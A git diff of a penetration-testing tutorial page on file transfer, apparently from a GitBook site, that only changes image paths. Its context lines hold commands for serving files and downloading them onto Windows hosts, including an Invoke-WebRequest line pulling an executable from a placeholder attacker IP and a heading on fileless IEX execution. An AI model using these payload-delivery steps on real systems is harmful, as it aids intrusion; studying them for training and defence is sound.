@@ -10,7 +10,7 @@ python3 -m http.server <port if you want to specify>
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (610).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1090).png" alt=""><figcaption></figcaption></figure>
 
 ### Using PHP&#x20;
 
@@ -20,7 +20,7 @@ sudo php -S 0.0.0.0:<port>
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (611).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1091).png" alt=""><figcaption></figcaption></figure>
 
 {% hint style="warning" %}
 _Note that the PHP server does not provide directory listing. It only allows files to be downloaded directly by specifying their path._
@@ -34,7 +34,7 @@ ruby -run -e httpd . -p <port>
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (612).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1092).png" alt=""><figcaption></figcaption></figure>
 
 ### Using busybox&#x20;
 
@@ -44,7 +44,7 @@ busybox httpd -f -p <port>
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (613).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1093).png" alt=""><figcaption></figcaption></figure>
 
 ## Web Download (Windows)
 
@@ -60,7 +60,7 @@ curl <web> -o <file output location> -s
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (616).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1096).png" alt=""><figcaption></figcaption></figure>
 
 ### Using Invoke-WebRequest
 
@@ -70,7 +70,7 @@ Invoke-WebRequest http://<attacker-ip>:8000/file.exe -OutFile file.exe
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (617).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1097).png" alt=""><figcaption></figcaption></figure>
 
 ### Using Net.WebClient
 
@@ -86,7 +86,7 @@ _Note that writing full path is mandatory while using the below method._&#x20;
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1098).png" alt=""><figcaption></figcaption></figure>
 
 #### DownloadFileAsync
 
@@ -96,7 +96,7 @@ _Note that writing full path is mandatory while using the below method._&#x20;
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (620).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>
 
 #### DownloadString
 
@@ -110,7 +110,7 @@ _Note that the DownloadString method return plain string we need to store it int
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (619).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>
 
 ### DownloadString - Fileless Method
 
@@ -128,5 +128,5 @@ Note that IEX can only execute .ps1 file directly from the web.&#x20;
 ```
 {% endcode %}
 
-<figure><img src="../../../../.gitbook/assets/image (621).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>
 
